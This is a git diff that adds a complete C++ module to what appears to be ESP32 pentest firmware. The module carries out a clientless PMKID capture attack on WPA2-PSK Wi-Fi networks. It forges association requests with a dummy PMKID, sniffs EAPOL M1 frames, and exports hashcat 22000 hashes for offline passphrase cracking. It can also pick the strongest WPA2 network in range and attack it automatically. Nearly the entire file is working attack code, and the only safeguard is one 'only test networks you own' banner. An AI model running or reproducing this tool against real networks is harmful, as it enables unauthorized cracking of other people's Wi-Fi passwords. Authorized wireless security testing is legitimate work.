new file mode 100644
index 00000000..9ddd5502
--- /dev/null
+++ b/src/modules/wifi/pmkid_capture.cpp
@@ -0,0 +1,769 @@
+#include "pmkid_capture.h"
+#if !defined(LITE_VERSION)
+
+#include "core/config.h"
+#include "core/display.h"
+#include "core/mykeyboard.h"
+#include "core/radio_mem.h"
+#include "core/seclab_util.h"
+#include "core/utils.h"
+#include "core/wifi/webInterface.h"
+#include "core/wifi/wifi_common.h"
+#include "esp_wifi.h"
+#include <Arduino.h>
+#include <LittleFS.h>
+#include <WiFi.h>
+#include <algorithm>
+#include <cctype>
+#include <cstring>
+#include <globals.h>
+#include <vector>
+
+/*
+ * Clientless PMKID capture, after the classic hcxdumptool idea:
+ *
+ *   ESP32 (fake STA) -- Association Request (RSN IE + PMKID list) --> AP
+ *   ESP32 (fake STA) <-- EAPOL M1 with PMKID KDE --------------------- AP
+ *
+ * No client has to be online and no deauthentication frame is emitted. The
+ * PMKID is written in hashcat -m 22000 "WPA*01" form, so there is no PCAP
+ * conversion step. Only WPA2-PSK (and mixed WPA2/WPA3) targets expose a
+ * usable PMKID this way; WPA3-SAE-only / PMF-mandatory targets are reported
+ * as "unlikely" but can still be probed (they simply answer with SAE).
+ */
+
+namespace {
+
+constexpr const char *kPmkidDir = "/pmkid";
+constexpr const char *kAllHashes = "/pmkid/all.hc22000";
+constexpr const char *kStatePath = "/pmkid_state.json";
+constexpr int kRingCap = 8;
+constexpr size_t kRingItemLen = 512;
+constexpr int kMaxCaptures = 24;
+constexpr uint32_t kAssocIntervalMs = 750;
+
+struct RingItem {
+    uint16_t len;
+    uint8_t data[kRingItemLen];
+    int8_t rssi;
+};
+
+struct Capture {
+    uint32_t tsSec;
+    char bssid[13];
+    char sta[13];
+    char ssid[33];
+    char pmkid[33];
+    int8_t rssi;
+};
+
+static portMUX_TYPE s_ringMux = portMUX_INITIALIZER_UNLOCKED;
+static RingItem *s_ring = nullptr;
+static volatile int s_ringHead = 0;
+static volatile int s_ringTail = 0;
+
+static SemaphoreHandle_t s_stateMux = nullptr;
+static TaskHandle_t s_task = nullptr;
+static volatile bool s_running = false;
+static volatile bool s_stopReq = false;
+
+static uint8_t s_apMac[6] = {0};
+static uint8_t s_staMac[6] = {0};
+static char s_ssid[33] = {0};
+static uint8_t s_channel = 1;
+static char s_lastErr[96] = {0};
+static wifi_mode_t s_prevMode = WIFI_MODE_NULL;
+static bool s_prevSta = false;
+
+static uint32_t s_assocSent = 0;
+static uint32_t s_eapolSeen = 0;
+static uint32_t s_m1Seen = 0;
+static uint32_t s_startedMs = 0;
+static std::vector<Capture> s_captures;
+static char s_lastPmkid[33] = {0};
+
+static void ensureStateMux() {
+    if (!s_stateMux) s_stateMux = xSemaphoreCreateMutex();
+}
+
+static void setErr(const String &e) {
+    strncpy(s_lastErr, e.c_str(), sizeof(s_lastErr) - 1);
+    s_lastErr[sizeof(s_lastErr) - 1] = 0;
+}
+
+static void IRAM_ATTR pmkidRxCb(void *buf, wifi_promiscuous_pkt_type_t type) {
+    if (type != WIFI_PKT_DATA || !s_ring) return;
+    const wifi_promiscuous_pkt_t *pkt = (const wifi_promiscuous_pkt_t *)buf;
+    if (!pkt || pkt->rx_ctrl.sig_len < 40 || pkt->rx_ctrl.sig_len > 700) return;
+
+    const uint8_t *f = pkt->payload;
+    // Data frames only (QoS data has subtype 8). WEP/protected bit may be set
+    // on the EAPOL frame before the 4-way handshake completes; we still parse.
+    uint8_t subtype = (f[0] >> 4) & 0x0F;
+    if (subtype != 0 && subtype != 8) return;
+    if (memcmp(f + 4, s_staMac, 6) != 0) return; // addr1 must be our fake STA
+    if (memcmp(f + 10, s_apMac, 6) != 0 && memcmp(f + 16, s_apMac, 6) != 0) return;
+
+    size_t off = 24;
+    if (subtype == 8) off += 2;                       // QoS control
+    if (f[1] & 0x80) off += 4;                       // HT control (Order bit)
+    if ((f[1] & 0x03) == 0x03) off += 6;             // WDS / 4-address frame
+    if (off + 8 > pkt->rx_ctrl.sig_len) return;
+    static const uint8_t kLlcSnapEapol[8] = {0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8E};
+    if (memcmp(f + off, kLlcSnapEapol, 8) != 0) return;
+    off += 8;
+
+    uint16_t len = (uint16_t)(pkt->rx_ctrl.sig_len - off);
+    if (len < 95 || len > kRingItemLen) return;
+
+    portENTER_CRITICAL_ISR(&s_ringMux);
+    int next = (s_ringHead + 1) % kRingCap;
+    if (next != s_ringTail) {
+        RingItem &slot = s_ring[s_ringHead];
+        slot.len = len;
+        slot.rssi = (int8_t)pkt->rx_ctrl.rssi;
+        memcpy(slot.data, f + off, len);
+        s_ringHead = next;
+    }
+    portEXIT_CRITICAL_ISR(&s_ringMux);
+}
+
+static bool popRing(RingItem &out) {
+    bool ok = false;
+    portENTER_CRITICAL(&s_ringMux);
+    if (s_ring && s_ringTail != s_ringHead) {
+        out = s_ring[s_ringTail];
+        s_ringTail = (s_ringTail + 1) % kRingCap;
+        ok = true;
+    }
+    portEXIT_CRITICAL(&s_ringMux);
+    return ok;
+}
+
+static size_t buildAssociationFrame(uint8_t *out, size_t cap) {
+    if (cap < 160) return 0;
+    memset(out, 0, cap);
+    size_t p = 0;
+    // --- 802.11 MAC header (Association Request, subtype 0) ---
+    out[p++] = 0x00;
+    out[p++] = 0x00;                       // FC
+    out[p++] = 0x3A;
+    out[p++] = 0x01;                       // duration
+    memcpy(out + p, s_apMac, 6); p += 6;    // addr1 = BSSID
+    memcpy(out + p, s_staMac, 6); p += 6;   // addr2 = our fake STA
+    memcpy(out + p, s_apMac, 6); p += 6;    // addr3 = BSSID
+    out[p++] = 0x00; out[p++] = 0x00;       // seq ctrl (driver fills)
+
+    // --- Fixed fields ---
+    out[p++] = 0x11; out[p++] = 0x00;       // capability: ESS | Privacy
+    out[p++] = 0x0A; out[p++] = 0x00;       // listen interval = 10
+
+    // --- SSID IE ---
+    size_t ssidLen = strnlen(s_ssid, 32);
+    out[p++] = 0x00; out[p++] = (uint8_t)ssidLen;
+    memcpy(out + p, s_ssid, ssidLen); p += ssidLen;
+
+    // --- Supported rates + extended rates ---
+    static const uint8_t kRates[8] = {0x82, 0x84, 0x8B, 0x96, 0x0C, 0x12, 0x18, 0x24};
+    static const uint8_t kExtRates[4] = {0x30, 0x48, 0x60, 0x6C};
+    out[p++] = 0x01; out[p++] = sizeof(kRates);
+    memcpy(out + p, kRates, sizeof(kRates)); p += sizeof(kRates);
+    out[p++] = 0x32; out[p++] = sizeof(kExtRates);
+    memcpy(out + p, kExtRates, sizeof(kExtRates)); p += sizeof(kExtRates);
+
+    // --- RSN IE with a PMKID list: this is what makes the AP attach a PMKID
+    //     KDE to EAPOL M1 even though no real client ever associated. ---
+    static const uint8_t kRsn[] = {
+        0x01, 0x00,                         // version 1
+        0x00, 0x0F, 0xAC, 0x04,             // group cipher: CCMP
+        0x01, 0x00,                         // pairwise suite count
+        0x00, 0x0F, 0xAC, 0x04,             // pairwise cipher: CCMP
+        0x01, 0x00,                         // AKM suite count
+        0x00, 0x0F, 0xAC, 0x02,             // AKM: PSK
+        0x0C, 0x00,                         // RSN capabilities
+        0x01, 0x00,                         // PMKID count = 1
+        0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
+        0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F  // dummy PMKID
+    };
+    out[p++] = 0x30; out[p++] = sizeof(kRsn);
+    memcpy(out + p, kRsn, sizeof(kRsn)); p += sizeof(kRsn);
+
+    return p;
+}
+
+// Extracts the 16-byte PMKID KDE from an EAPOL-Key M1 Key Data field.
+static bool extractPmkid(const uint8_t *eapol, size_t len, uint8_t pmkidOut[16]) {
+    if (len < 95) return false;
+    if (eapol[1] != 0x03) return false; // EAPOL-Key
+    uint16_t bodyLen = (uint16_t)((eapol[2] << 8) | eapol[3]);
+    if (bodyLen < 91 || (size_t)bodyLen + 4 > len) return false;
+
+    uint16_t ki = (uint16_t)((eapol[5] << 8) | eapol[6]);
+    bool pairwise = (ki & 0x0008) != 0;
+    bool keyAck = (ki & 0x0080) != 0;
+    bool keyMic = (ki & 0x0100) != 0;
+    if (!pairwise || !keyAck || keyMic) return false; // M1 only
+
+    size_t kdLenOff = 4 + 1 + 2 + 2 + 8 + 32 + 16 + 8 + 8 + 16; // descriptor type + Key MIC
+    if (kdLenOff + 2 > len) return false;
+    size_t kdLen = (size_t)((eapol[kdLenOff] << 8) | eapol[kdLenOff + 1]);
+    size_t kdOff = kdLenOff + 2;
+    if (kdOff + kdLen > len) kdLen = len - kdOff;
+
+    size_t i = 0;
+    while (i + 2 <= kdLen) {
+        uint8_t tag = eapol[kdOff + i];
+        uint8_t tl = eapol[kdOff + i + 1];
+        if (i + 2 + tl > kdLen) break;
+        const uint8_t *d = eapol + kdOff + i + 2;
+        // RSN PMKID KDE: 00:0F:AC:04 + 16 bytes PMKID.
+        if (tag == 0xDD && tl >= 20 && d[0] == 0x00 && d[1] == 0x0F && d[2] == 0xAC && d[3] == 0x04) {
+            memcpy(pmkidOut, d + 4, 16);
+            return true;
+        }
+        i += 2 + tl;
+    }
+    return false;
+}
+
+static String hc22000Line(const Capture &c) {
+    String line = "WPA*01*";
+    line += c.pmkid;
+    line += "*";
+    line += c.bssid;
+    line += "*";
+    line += c.sta;
+    line += "*";
+    line += seclabHex((const uint8_t *)c.ssid, strnlen(c.ssid, 32));
+    line += "***00"; // hashcat 22000: trailing message-pair field for PMKID
+    return line;
+}
+
+static String perNetworkPath(const Capture &c) {
+    String safe;
+    for (size_t i = 0; i < strlen(c.ssid); i++) {
+        char ch = c.ssid[i];
+        safe += (isalnum((unsigned char)ch) || ch == '-' || ch == '_') ? ch : '_';
+    }
+    if (safe.isEmpty()) safe = "hidden";
+    return String(kPmkidDir) + "/" + safe + ".hc22000";
+}
+
+static void appendCaptureLogLocked(const Capture &c) {
+    seclabAppendLog("/pmkid_capture.log", String(c.tsSec) + "," + c.bssid + "," + c.pmkid);
+}
+
+static void writeHc22000Locked(const Capture &c, bool appendLog = true) {
+    String line = hc22000Line(c);
+    seclabEnsureDir(kPmkidDir);
+    File all = LittleFS.open(kAllHashes, FILE_APPEND);
+    if (all) {
+        all.println(line);
+        all.close();
+    }
+    // Per-network file for a clean Hashcat hand-off. APPEND keeps every capture.
+    String per = perNetworkPath(c);
+    File f = LittleFS.open(per, FILE_APPEND);
+    if (f) {
+        f.println(line);
+        f.close();
+    }
+    if (appendLog) appendCaptureLogLocked(c);
+}
+
+static void clearHashFilesLocked(bool includeLog) {
+    seclabEnsureDir(kPmkidDir);
+    LittleFS.remove(kAllHashes);
+    if (includeLog) LittleFS.remove("/pmkid_capture.log");
+    std::vector<String> cleared;
+    for (const auto &c : s_captures) {
+        String per = perNetworkPath(c);
+        if (std::find(cleared.begin(), cleared.end(), per) != cleared.end()) continue;
+        cleared.push_back(per);
+        LittleFS.remove(per);
+    }
+}
+
+static void exportAllHc22000Locked() {
+    clearHashFilesLocked(false);
+    for (const auto &c : s_captures) writeHc22000Locked(c, false);
+}
+
+static void persistStateLocked() {
+    String j = "{";
+    j += "\"running\":" + String(s_running ? "true" : "false") + ",";
+    j += "\"ssid\":\"" + seclabJsonEscape(s_ssid) + "\",";
+    j += "\"bssid\":\"" + seclabJsonEscape(seclabMacColon(s_apMac)) + "\",";
+    j += "\"channel\":" + String((int)s_channel) + ",";
+    j += "\"lastErr\":\"" + seclabJsonEscape(s_lastErr) + "\",";
+    j += "\"assocSent\":" + String((unsigned long)s_assocSent) + ",";
+    j += "\"eapol\":" + String((unsigned long)s_eapolSeen) + ",";
+    j += "\"m1\":" + String((unsigned long)s_m1Seen) + ",";
+    j += "\"hashes\":" + String((int)s_captures.size()) + ",";
+    j += "\"autoExport\":" + String(bruceConfig.seclabPlus.pmkidAutoExport ? "true" : "false") + ",";
+    j += "\"uptimeSec\":" + String(s_running ? (unsigned long)((millis() - s_startedMs) / 1000UL) : 0UL) + ",";
+    j += "\"captures\":[";
+    for (size_t i = 0; i < s_captures.size(); i++) {
+        const Capture &c = s_captures[i];
+        if (i) j += ",";
+        j += "{\"ts\":" + String((unsigned long)c.tsSec) + ",\"bssid\":\"" + c.bssid +
+             "\",\"sta\":\"" + c.sta + "\",\"ssid\":\"" + seclabJsonEscape(c.ssid) +
+             "\",\"pmkid\":\"" + c.pmkid + "\",\"rssi\":" + String((int)c.rssi) + "}";
+    }
+    j += "]}";
+    seclabWriteState(kStatePath, j);
+}
+
+static void restoreRadio() {
+    esp_wifi_set_promiscuous_rx_cb(nullptr);
+    esp_wifi_set_promiscuous(false);
+    WiFi.mode(s_prevMode);
+    if (s_prevSta) {
+        WiFi.begin(); // reconnect to remembered credentials if any
+    }
+}
+
+static void pmkidTask(void *) {
+    uint8_t assoc[192];
+    uint32_t lastAssoc = 0;
+    uint32_t lastState = 0;
+
+    while (!s_stopReq) {
+        RingItem item;
+        int drained = 0;
+        while (drained < 4 && popRing(item)) {
+            drained++;
+            s_eapolSeen++;
+            uint8_t pmkid[16];
+            if (extractPmkid(item.data, item.len, pmkid)) {
+                s_m1Seen++;
+                String hex = seclabHex(pmkid, 16);
+                if (hex != s_lastPmkid) {
+                    strncpy(s_lastPmkid, hex.c_str(), sizeof(s_lastPmkid) - 1);
+                    s_lastPmkid[sizeof(s_lastPmkid) - 1] = 0;
+
+                    Capture c = {};
+                    c.tsSec = seclabUptimeSec();
+                    strncpy(c.bssid, seclabMacHex(s_apMac).c_str(), sizeof(c.bssid) - 1);
+                    strncpy(c.sta, seclabMacHex(s_staMac).c_str(), sizeof(c.sta) - 1);
+                    strncpy(c.ssid, s_ssid, sizeof(c.ssid) - 1);
+                    strncpy(c.pmkid, s_lastPmkid, sizeof(c.pmkid) - 1);
+                    c.rssi = item.rssi;
+
+                    ensureStateMux();
+                    if (xSemaphoreTake(s_stateMux, pdMS_TO_TICKS(100)) == pdTRUE) {
+                        if (s_captures.size() >= kMaxCaptures) s_captures.erase(s_captures.begin());
+                        s_captures.push_back(c);
+                        if (bruceConfig.seclabPlus.pmkidAutoExport) writeHc22000Locked(c, true);
+                        else appendCaptureLogLocked(c);
+                        persistStateLocked();
+                        xSemaphoreGive(s_stateMux);
+                    }
+                }
+            }
+        }
+
+        if (millis() - lastAssoc >= kAssocIntervalMs) {
+            lastAssoc = millis();
+            size_t n = buildAssociationFrame(assoc, sizeof(assoc));
+            if (n > 0) {
+                wifiRawTx(WIFI_IF_STA, assoc, (int)n, 4);
+                s_assocSent++;
+            }
+        }
+
+        if (millis() - lastState > 2000) {
+            lastState = millis();
+            ensureStateMux();
+            if (xSemaphoreTake(s_stateMux, pdMS_TO_TICKS(50)) == pdTRUE) {
+                persistStateLocked();
+                xSemaphoreGive(s_stateMux);
+            }
+        }
+        vTaskDelay(pdMS_TO_TICKS(20));
+    }
+
+    restoreRadio();
+    if (s_ring) {
+        free(s_ring);
+        s_ring = nullptr;
+    }
+    s_ringHead = s_ringTail = 0;
+    ensureStateMux();
+    if (xSemaphoreTake(s_stateMux, pdMS_TO_TICKS(200)) == pdTRUE) {
+        persistStateLocked();
+        xSemaphoreGive(s_stateMux);
+    }
+    s_running = false;
+    s_task = nullptr;
+    vTaskDelete(NULL);
+}
+
+static bool startEngine(const String &bssid, const String &ssid, uint8_t channel, String *errOut) {
+    if (s_running) return true;
+    if (!seclabParseMac(bssid, s_apMac)) {
+        if (errOut) *errOut = "Invalid BSSID";
+        return false;
+    }
+    if (ssid.isEmpty() || ssid.length() > 32) {
+        if (errOut) *errOut = "SSID must be 1..32 bytes";
+        return false;
+    }
+    if (channel < 1 || channel > 14) {
+        if (errOut) *errOut = "Channel must be 1..14";
+        return false;
+    }
+    if (!radioHasMemForWifi()) {
+        if (errOut) *errOut = "Low DMA RAM for Wi-Fi";
+        return false;
+    }
+
+    ensureStateMux();
+    s_captures.clear();
+    s_assocSent = s_eapolSeen = s_m1Seen = 0;
+    s_lastPmkid[0] = 0;
+    s_lastErr[0] = 0;
+    strncpy(s_ssid, ssid.c_str(), sizeof(s_ssid) - 1);
+    s_ssid[sizeof(s_ssid) - 1] = 0;
+    s_channel = channel;
+
+    s_prevMode = WiFi.getMode();
+    s_prevSta = WiFi.isConnected();
+    ensureWifiPlatform();
+    WiFi.mode(WIFI_STA);
+    esp_wifi_get_mac(WIFI_IF_STA, s_staMac);
+
+    wifi_promiscuous_filter_t filter = {};
+    filter.filter_mask = WIFI_PROMIS_FILTER_MASK_DATA | WIFI_PROMIS_FILTER_MASK_MGMT;
+    if (esp_wifi_set_promiscuous_filter(&filter) != ESP_OK ||
+        esp_wifi_set_promiscuous_rx_cb(pmkidRxCb) != ESP_OK ||
+        esp_wifi_set_promiscuous(true) != ESP_OK) {
+        setErr("Promiscuous mode failed");
+        if (errOut) *errOut = s_lastErr;
+        restoreRadio();
+        return false;
+    }
+    esp_wifi_set_channel(s_channel, WIFI_SECOND_CHAN_NONE);
+    WiFi.setSleep(WIFI_PS_NONE);
+
+    s_ring = (RingItem *)calloc(kRingCap, sizeof(RingItem));
+    if (!s_ring) {
+        setErr("Out of RAM");
+        if (errOut) *errOut = s_lastErr;
+        restoreRadio();
+        return false;
+    }
+    s_ringHead = s_ringTail = 0;
+
+    s_stopReq = false;
+    s_running = true;
+    s_startedMs = millis();
+    if (xTaskCreatePinnedToCore(pmkidTask, "pmkidCap", 4608, nullptr, 2, &s_task, 0) != pdPASS) {
+        s_running = false;
+        s_task = nullptr;
+        setErr("Capture task spawn failed");
+        if (errOut) *errOut = s_lastErr;
+        free(s_ring);
+        s_ring = nullptr;
+        restoreRadio();
+        return false;
+    }
+    return true;
+}
+
+static void stopEngine() {
+    if (!s_running) return;
+    s_stopReq = true;
+    for (int i = 0; i < 60 && s_running; i++) vTaskDelay(pdMS_TO_TICKS(25));
+}
+
+struct ApPick {
+    String ssid;
+    String bssid;
+    uint8_t ch;
+    int rssi;
+    String auth;
+    bool wpa3Only;
+};
+
+static std::vector<ApPick> scanTargets() {
+    std::vector<ApPick> out;
+    int n = WiFi.scanNetworks(false, true);
+    if (n <= 0) {
+        WiFi.scanDelete();
+        return out;
+    }
+    for (int i = 0; i < n && (int)out.size() < 28; i++) {
+        String ssid = WiFi.SSID(i);
+        if (ssid.isEmpty()) continue; // hidden SSID cannot be put in the Assoc IE
+        uint8_t *b = WiFi.BSSID(i);
+        if (!b) continue;
+        wifi_auth_mode_t am = WiFi.encryptionType(i);
+        bool open = (am == WIFI_AUTH_OPEN);
+        if (open) continue;
+
+        ApPick p;
+        p.ssid = ssid;
+        char mac[18];
+        snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X", b[0], b[1], b[2], b[3], b[4], b[5]);
+        p.bssid = mac;
+        p.ch = (uint8_t)WiFi.channel(i);
+        p.rssi = WiFi.RSSI(i);
+        p.wpa3Only = (am == WIFI_AUTH_WPA3_PSK);
+        switch (am) {
+            case WIFI_AUTH_WPA_PSK: p.auth = "WPA"; break;
+            case WIFI_AUTH_WPA2_PSK: p.auth = "WPA2"; break;
+            case WIFI_AUTH_WPA_WPA2_PSK: p.auth = "WPA/WPA2"; break;
+            case WIFI_AUTH_WPA3_PSK: p.auth = "WPA3"; break;
+            case WIFI_AUTH_WPA2_WPA3_PSK: p.auth = "WPA2/3"; break;
+            case WIFI_AUTH_WPA2_ENTERPRISE: p.auth = "WPA2-EAP"; break;
+            default: p.auth = "Other"; break;
+        }
+        if (p.auth == "WPA2-EAP" || p.auth == "Other") continue; // no PSK -> no PMKID
+        out.push_back(p);
+    }
+    WiFi.scanDelete();
+    std::sort(out.begin(), out.end(), [](const ApPick &a, const ApPick &b) { return a.rssi > b.rssi; });
+    return out;
+}
+
+} // namespace
+
+bool pmkidStart(const String &bssid, const String &ssid, uint8_t channel, String *errOut) {
+    return startEngine(bssid, ssid, channel, errOut);
+}
+
+bool pmkidStartStrongest(String *errOut) {
+    std::vector<ApPick> aps = scanTargets();
+    for (const auto &p : aps) {
+        if (!p.wpa3Only) return startEngine(p.bssid, p.ssid, p.ch, errOut);
+    }
+    if (errOut) *errOut = aps.empty() ? "No WPA-PSK networks found" : "Only WPA3-SAE networks in range";
+    return false;
+}
+
+void pmkidStop() { stopEngine(); }
+
+bool pmkidIsRunning() { return s_running; }
+
+bool pmkidExportHc22000(String *pathOut) {
+    ensureStateMux();
+    bool ok = false;
+    if (xSemaphoreTake(s_stateMux, pdMS_TO_TICKS(200)) == pdTRUE) {
+        // Rebuild from the in-memory captures: works even when live auto-export is OFF.
+        exportAllHc22000Locked();
+        ok = !s_captures.empty() && LittleFS.exists(kAllHashes);
+        persistStateLocked();
+        xSemaphoreGive(s_stateMux);
+    }
+    if (pathOut) *pathOut = kAllHashes;
+    return ok;
+}
+
+bool pmkidClear() {
+    if (s_running) return false;
+    ensureStateMux();
+    if (xSemaphoreTake(s_stateMux, pdMS_TO_TICKS(200)) != pdTRUE) return false;
+    {
+        s_captures.clear();
+        s_assocSent = s_eapolSeen = s_m1Seen = 0;
+        s_lastErr[0] = 0;
+        clearHashFilesLocked(true);
+        persistStateLocked();
+        xSemaphoreGive(s_stateMux);
+    }
+    return true;
+}
+
+String pmkidGetStateJson() {
+    ensureStateMux();
+    if (xSemaphoreTake(s_stateMux, pdMS_TO_TICKS(100)) != pdTRUE) {
+        return seclabReadState(kStatePath, 8192);
+    }
+    String j = "{";
+    j += "\"running\":" + String(s_running ? "true" : "false") + ",";
+    j += "\"ssid\":\"" + seclabJsonEscape(s_ssid) + "\",";
+    j += "\"bssid\":\"" + seclabJsonEscape(seclabMacColon(s_apMac)) + "\",";
+    j += "\"channel\":" + String((int)s_channel) + ",";
+    j += "\"sta\":\"" + seclabJsonEscape(seclabMacColon(s_staMac)) + "\",";
+    j += "\"lastErr\":\"" + seclabJsonEscape(s_lastErr) + "\",";
+    j += "\"assocSent\":" + String((unsigned long)s_assocSent) + ",";
+    j += "\"eapol\":" + String((unsigned long)s_eapolSeen) + ",";
+    j += "\"m1\":" + String((unsigned long)s_m1Seen) + ",";
+    j += "\"hashes\":" + String((int)s_captures.size()) + ",";
+    j += "\"autoExport\":" + String(bruceConfig.seclabPlus.pmkidAutoExport ? "true" : "false") + ",";
+    j += "\"uptimeSec\":" + String(s_running ? (unsigned long)((millis() - s_startedMs) / 1000UL) : 0UL) + ",";
+    j += String("\"file\":\"") + kAllHashes + "\",";
+    j += "\"fileBytes\":" + String(LittleFS.exists(kAllHashes) ? (unsigned long)LittleFS.open(kAllHashes, FILE_READ).size() : 0UL) + ",";
+    j += "\"captures\":[";
+    for (size_t i = 0; i < s_captures.size(); i++) {
+        const Capture &c = s_captures[i];
+        if (i) j += ",";
+        j += "{\"ts\":" + String((unsigned long)c.tsSec) + ",\"bssid\":\"" + c.bssid +
+             "\",\"ssid\":\"" + seclabJsonEscape(c.ssid) + "\",\"pmkid\":\"" + c.pmkid +
+             "\",\"rssi\":" + String((int)c.rssi) + "}";
+    }
+    j += "]}";
+    xSemaphoreGive(s_stateMux);
+    return j;
+}
+
+void pmkid_capture_setup() {
+    cleanlyStopWebUiForWiFiFeature();
+    radioFreeBleForWifi();
+    if (!radioHasMemForWifi()) {
+        displayError("Low DMA RAM for Wi-Fi", true);
+        return;
+    }
+
+    if (s_running) {
+        int runningChoice = -1;
+        options = {
+            {"Stop PMKID Capture", [&]() { runningChoice = 0; }},
+            {"View /pmkid/all.hc22000", [&]() { runningChoice = 1; }},
+            {"Back", [&]() { runningChoice = -1; }},
+        };
+        loopOptions(options, MENU_TYPE_SUBMENU, "PMKID Already Running");
+        options.clear();
+        if (runningChoice == 0) { pmkidStop(); displayInfo("PMKID capture stopped", true); }
+        else if (runningChoice == 1) {
+            if (LittleFS.exists(kAllHashes)) loopSD(LittleFS, false, "*", "/pmkid");
+            else displayInfo("No hash file yet", true);
+        }
+        return;
+    }
+
+    bool autoExport = bruceConfig.seclabPlus.pmkidAutoExport;
+    int mode = -1;
+    options = {
+        {"Start strongest WPA2 target", [&]() { mode = 0; }},
+        {"Pick scanned target...", [&]() { mode = 1; }},
+        {String("Auto-export: ") + (autoExport ? "ON" : "OFF"), [&]() { mode = 2; }},
+        {"Export .hc22000", [&]() { mode = 3; }},
+        {"Clear Captures", [&]() { mode = 4; }},
+        {"View /pmkid/all.hc22000", [&]() { mode = 5; }},
+        {"Back", [&]() { mode = -1; }},
+    };
+    loopOptions(options, MENU_TYPE_SUBMENU, "Clientless PMKID");
+    options.clear();
+
+    if (mode == 2) {
+        bruceConfig.seclabPlus.pmkidAutoExport = !autoExport;
+        bruceConfig.saveFile();
+        displayInfo(String("Auto-export ") + (bruceConfig.seclabPlus.pmkidAutoExport ? "ON" : "OFF"), true);
+        return;
+    }
+    if (mode == 3) {
+        bool ok = pmkidExportHc22000(nullptr);
+        displayInfo(ok ? String("Saved ") + kAllHashes : String("No captures to export"), true);
+        return;
+    }
+    if (mode == 4) {
+        bool ok = pmkidClear();
+        displayInfo(ok ? "PMKID captures cleared" : "Could not clear captures", true);
+        return;
+    }
+    if (mode == 5) {
+        if (LittleFS.exists(kAllHashes)) loopSD(LittleFS, false, "*", "/pmkid");
+        else displayInfo("No hash file yet", true);
+        return;
+    }
+    if (mode != 0 && mode != 1) return;
+
+    String err;
+    if (mode == 0) {
+        if (!pmkidStartStrongest(&err)) {
+            displayError("Start failed: " + err, true);
+            return;
+        }
+    } else {
+        displayTextLine("Scanning WPA networks...");
+        std::vector<ApPick> aps = scanTargets();
+        if (aps.empty()) {
+            displayWarning("No WPA-PSK networks found", true);
+            return;
+        }
+        int pick = -1;
+        options.clear();
+        for (size_t i = 0; i < aps.size(); i++) {
+            String lbl = aps[i].ssid.substring(0, 16) + " " + aps[i].auth + " " + String(aps[i].rssi) + "dB";
+            if (aps[i].wpa3Only) lbl += " (SAE!)";
+            options.push_back({lbl, [&, i]() { pick = (int)i; }});
+        }
+        options.push_back({"Cancel", [&]() { pick = -1; }});
+        loopOptions(options, MENU_TYPE_SUBMENU, "Select WPA2 target");
+        options.clear();
+        if (pick < 0 || pick >= (int)aps.size()) return;
+
+        const ApPick &t = aps[pick];
+        if (t.wpa3Only) {
+            displayWarning("WPA3-SAE only: PMKID unlikely.\nUse CSA/PMF test instead.", true);
+        }
+        drawMainBorderWithTitle("CLIENTLESS PMKID");
+        padprintln("Only test networks you own.");
+        padprintln("No deauth, no client needed.");
+        padprintln("Target: " + t.ssid);
+        padprintln("Hold Boot to abort.");
+        if (!pmkidStart(t.bssid, t.ssid, t.ch, &err)) {
+            displayError("Start failed: " + err, true);
+            return;
+        }
+        if (t.auth.indexOf("WPA3") >= 0) {
+            displayWarning("Mixed WPA2/3 target: PMKID may be absent", true);
+        }
+    }
+
+    uint32_t lastDraw = 0;
+    returnToMenu = false;
+    while (s_running && !returnToMenu) {
+        if (check(EscPress)) break;
+        if (check(SelPress)) {
+            options = {
+                {"Stop & Save", [&]() { returnToMenu = true; }},
+                {"Force Re-Assoc", []() { /* engine retries on its interval */ }},
+                {"Back", []() {}},
+            };
+            loopOptions(options, MENU_TYPE_SUBMENU, "PMKID Capture");
+            options.clear();
+        }
+        if (millis() - lastDraw > 400) {
+            lastDraw = millis();
+            drawMainBorderWithTitle("CLIENTLESS PMKID");
+            padprintln("SSID : " + String(s_ssid));
+            padprintln("BSSID: " + seclabMacColon(s_apMac));
+            padprintln("CH   : " + String((int)s_channel));
+            padprintln("Assoc: " + String((unsigned long)s_assocSent) +
+                       "  EAPOL: " + String((unsigned long)s_eapolSeen));
+            padprintln("M1   : " + String((unsigned long)s_m1Seen) +
+                       "  PMKID: " + String((int)s_captures.size()));
+            padprintln("");
+            if (s_captures.empty()) {
+                padprintln("Waiting for EAPOL M1...");
+            } else {
+                padprintln("LAST PMKID:");
+                padprintln(String(s_lastPmkid).substring(0, 16));
+                padprintln(String(s_lastPmkid).substring(16));
+                padprintln(bruceConfig.seclabPlus.pmkidAutoExport ? String("Saved to ") + kAllHashes
+                                                                  : String("Export with Stop & Save"));
+            }
+        }
+        vTaskDelay(pdMS_TO_TICKS(30));
+    }
+    pmkidStop();
+    bool ok = pmkidExportHc22000(nullptr);
+    if (ok) displaySuccess(String("Saved ") + kAllHashes, true);
+    else displayError("No PMKID captured or export failed", true);
+}
+
+#else  // LITE_VERSION
+
+void pmkid_capture_setup() {}
+bool pmkidStart(const String &, const String &, uint8_t, String *) { return false; }
+bool pmkidStartStrongest(String *errOut) { if (errOut) *errOut = "LITE build"; return false; }
+void pmkidStop() {}
+bool pmkidIsRunning() { return false; }
+String pmkidGetStateJson() { return "{}"; }
+bool pmkidExportHc22000(String *) { return false; }
+bool pmkidClear() { return false; }
+
+#endif
